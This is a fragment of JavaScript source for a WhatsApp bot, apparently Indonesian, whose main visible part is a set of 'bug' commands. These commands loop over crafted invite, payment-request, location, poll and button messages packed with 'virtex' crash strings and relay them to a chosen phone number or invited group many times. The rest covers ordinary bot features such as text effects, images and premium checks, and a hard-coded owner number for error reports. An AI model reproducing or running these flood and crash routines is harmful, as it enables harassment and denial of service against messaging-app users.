let cekno = await jarot.onWhatsApp(numt)
if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
if (isNaN(jumlah)) return reply(`Harus berupa angka`)
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6285850539404@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-jarot ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-jarot ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
...
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-jarot ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
jarot.relayMessage(numt, buginvite.message, { messageId: buginvite.key.id })
jarot.relayMessage(numt, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
jarot.relayMessage(numt, pollCreation.message, { messageId: pollCreation.key.id })
jarot.relayMessage(numt, order.message, { messageId: order.key.id })
jarot.relayMessage(numt, audio.message, { messageId: audio.key.id })
jarot.relayMessage(numt, image.message, { messageId: image.key.id })
jarot.relayMessage(numt, document.message, { messageId: document.key.id })
jarot.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
jarot.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
jarot.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-jarot ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-jarot ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
jarot.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
}
break
case 'sendbug':{
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await jarot.groupAcceptInvite(result)
jarot.relayMessage(kir, {
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `jarot Bot ${virus}${virtex(prefix)}`, 
...
"name": `jarot Bot WhatsApp ${virus}`,
"address": `Created By jarot ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted: lep })
jarot.relayMessage(kir, location.message, { messageId: location.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
case 'leaves': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Example : ${prefix+command} jarot`) 
let link
...
jarot.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
...
jarot.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
...
jarot.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.succes}` }, { quoted: m })
}
break
...
jarot.sendMessage(m.chat, buttonMessaage, { quoted: m })
}
break
case 'fox':  
case 'dog':  
...
jarot.sendMessage(m.chat, { image: anu1, caption: `${mess.succes}` }, { quoted : m })
break
case 'jjmeryani':{
if (!isPrem) return replyprem(mess.premium)
...
jarot.sendMessage(m.chat,{video:{url:hayu},caption:`${mess.succes}`},{quoted: m})
}
break
case 'cerpen_anak':{
if (!isPrem) return replyprem(mess.premium)
...
jarot.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}
...
let e = String(err)
jarot.sendMessage("6285850539404@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
